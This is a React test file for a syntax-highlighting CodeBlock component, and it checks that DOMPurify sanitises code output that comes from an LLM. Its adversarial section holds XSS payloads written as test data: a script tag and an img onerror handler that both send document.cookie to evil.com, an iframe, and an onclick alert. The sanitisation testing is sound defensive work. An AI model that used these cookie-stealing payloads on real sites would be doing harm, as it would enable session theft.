import { render, screen, waitFor } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import CodeBlock from './CodeBlock';

// Mock de shiki: refleja el input literalmente dentro de un span
// (simula el caso real donde shiki escapa <, >, etc. pero queremos
// verificar que la capa de DOMPurify elimina cualquier tag peligroso).
vi.mock('shiki', () => ({
  createHighlighter: vi.fn().mockResolvedValue({
    codeToHtml: (code: string) => `<pre><code><span class="hl">${code}</span></code></pre>`,
  }),
}));

describe('CodeBlock', () => {
  it('muestra el código como fallback mientras carga shiki', () => {
    render(<CodeBlock code="const x = 1;" />);
    expect(screen.getByText('const x = 1;')).toBeInTheDocument();
  });

  it('aplica syntax highlighting después de cargar', async () => {
    render(<CodeBlock code="const x = 1;" />);
    await waitFor(() => {
      const container = document.querySelector('.hl');
      expect(container).toBeInTheDocument();
      expect(container?.textContent).toBe('const x = 1;');
    });
  });

  it('pasa el lang a shiki', async () => {
    const shiki = await import('shiki');
    const highlighter = await (shiki.createHighlighter as ReturnType<typeof vi.fn>)();
    const spy = vi.spyOn(highlighter, 'codeToHtml');

    render(<CodeBlock code="print('hi')" lang="python" />);
    await waitFor(() => {
      expect(spy).toHaveBeenCalledWith("print('hi')", {
        lang: 'python',
        theme: 'github-dark',
      });
    });
  });

  // --- Tests adversariales (XSS via dangerouslySetInnerHTML) ---

  it('elimina <script> que venga del LLM', async () => {
    const payload = '</span><script>fetch("//evil.com/"+document.cookie)</script>';
    render(<CodeBlock code={payload} />);
    await waitFor(() => {
      expect(document.querySelector('script')).toBeNull();
    });
  });

  it('elimina <img onerror> que venga del LLM', async () => {
    const payload = '<img src=x onerror="fetch(`//evil.com/${document.cookie}`)">';
    render(<CodeBlock code={payload} />);
    await waitFor(() => {
      expect(document.querySelector('img')).toBeNull();
    });
  });

  it('elimina event handlers inline como onclick', async () => {
    const payload = '<a href="#" onclick="alert(1)">click</a>';
    render(<CodeBlock code={payload} />);
    await waitFor(() => {
      const anchors = document.querySelectorAll('a');
      anchors.forEach((a) => {
        expect(a.getAttribute('onclick')).toBeNull();
      });
    });
  });

  it('elimina iframes', async () => {
    const payload = '<iframe src="https://evil.com"></iframe>';
    render(<CodeBlock code={payload} />);
    await waitFor(() => {
      expect(document.querySelector('iframe')).toBeNull();
    });
  });

  it('preserva tags permitidos (pre, code, span) y sus clases', async () => {
    render(<CodeBlock code="const x = 1;" />);
    await waitFor(() => {
      expect(document.querySelector('pre')).toBeInTheDocument();
      expect(document.querySelector('code')).toBeInTheDocument();
      expect(document.querySelector('span.hl')).toBeInTheDocument();
    });
  });
});
